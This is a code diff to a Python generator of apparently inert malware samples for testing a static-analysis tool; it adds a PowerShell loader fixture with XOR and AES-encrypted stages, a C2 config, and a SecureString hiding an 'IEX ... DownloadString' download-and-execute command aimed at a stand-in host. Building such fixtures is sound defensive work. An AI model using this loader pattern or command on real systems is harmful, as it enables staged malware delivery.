@@ -1184,6 +1184,50 @@ def encoded_blobs_ps1() -> bytes:
     ]).encode("utf-8")
 
 
+def crypto_loader_ps1() -> bytes:
+    """PowerShell loader whose stages are encrypted with key material written in
+    the script itself (inert): a PE (MZ + text stub) XOR'ed with one byte, a
+    GZIP'ed config under AES-256-CBC with [byte[]] key/IV arrays, and a payload
+    in a SecureString exported with -Key (1..32). Static analysis recovers all
+    three: the XOR'ed PE and the AES config as nested children (with their
+    recipe), the SecureString decrypted in place."""
+    import base64
+    import gzip
+
+    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
+
+    def aes(key: bytes, iv: bytes, data: bytes) -> bytes:
+        pad = 16 - len(data) % 16
+        return Cipher(algorithms.AES(key), modes.CBC(iv)).encryptor().update(data + bytes([pad]) * pad)
+
+    pe = (b"MZ" + b"\x90" * 58 + (0x80).to_bytes(4, "little") + b"\x00" * 64
+          + b"This program cannot be run in DOS mode. Inert DocuTraceX stub (invoice-2024-0613). " * 4)
+    xored = base64.b64encode(bytes(b ^ 0x5A for b in pe)).decode()
+    key, iv = bytes(range(11, 43)), bytes(range(200, 216))
+    cfg = gzip.compress(("[sync]\r\nserver=http://billing-portal.example/inv/aes-c2\r\n"
+                         "interval=3600\r\nid=" + "a1b2c3d4" * 40 + "\r\n").encode(), mtime=0)
+    cfg_ct = base64.b64encode(aes(key, iv, cfg)).decode()
+    ss_plain = "IEX (New-Object Net.WebClient).DownloadString('http://billing-portal.example/inv/ss-stage.ps1')"
+    ss_iv = bytes(range(16))
+    inner = f"2|{base64.b64encode(ss_iv).decode()}|{aes(bytes(range(1, 33)), ss_iv, ss_plain.encode('utf-16-le')).hex()}"
+    ss_blob = "76492d1116743f0423413b16050a5345" + base64.b64encode(inner.encode("utf-16-le")).decode()
+    return "\r\n".join([
+        "# invoice-2024-0613 sync agent: stages encrypted with keys kept in the script",
+        "function Open-Blob($b64, $k) { $d = [Convert]::FromBase64String($b64); for ($i = 0; $i -lt $d.Length; $i++) { $d[$i] = $d[$i] -bxor $k }; $d }",
+        "function Open-Cfg($b64, $k, $v) { $a = [Security.Cryptography.Aes]::Create(); $a.Key = $k; $a.IV = $v",
+        "  $a.CreateDecryptor().TransformFinalBlock([Convert]::FromBase64String($b64), 0, ([Convert]::FromBase64String($b64)).Length) }",
+        f"[byte[]]$aesKey = @({','.join(map(str, key))})",
+        f"[byte[]]$aesIV = @({','.join(map(str, iv))})",
+        f"$img = Open-Blob '{xored}' 0x5A",
+        f"$cfg = Open-Cfg '{cfg_ct}' $aesKey $aesIV",
+        f"$enc = '{ss_blob}'",
+        "$ss = ConvertTo-SecureString $enc -Key (1..32)",
+        "$cmd = [Runtime.InteropServices.Marshal]::PtrToStringAuto([Runtime.InteropServices.Marshal]::SecureStringToBSTR($ss))",
+        "iex $cmd",
+        "",
+    ]).encode("utf-8")
+
+
 def build_all() -> dict[str, bytes]:
     out: dict[str, bytes] = {
         "sample.docx": word_docx(), "sample.docm": word_docm(),
@@ -1193,7 +1237,7 @@ def build_all() -> dict[str, bytes]:
         "sample_dropper.js": obf_js(), "sample_obfuscatorio.js": obf_obfuscatorio_js(),
         "sample_obf_techniques.js": obf_techniques_js(),
         "sample_chain_dropper.js": chain_dropper_js(), "sample_wsh_selfread.js": wsh_selfread_dropper_js(), "sample_xor_stager.ps1": xor_stager_ps1(),
-        "sample_encoded_blobs.ps1": encoded_blobs_ps1(),
+        "sample_encoded_blobs.ps1": encoded_blobs_ps1(), "sample_crypto_loader.ps1": crypto_loader_ps1(),
         "sample_stage2.ps1": stage2_ps1(), "sample_dropper.vbs": dropper_vbs(),
         "sample_dropper.bat": dropper_bat(), "sample_ioc_noise.bat": ioc_noise_bat(), "sample_loader.hta": loader_hta(),
         "sample_shortcut.pdf.lnk": shortcut_lnk(), "sample_shortcut.url": internet_shortcut_url(),
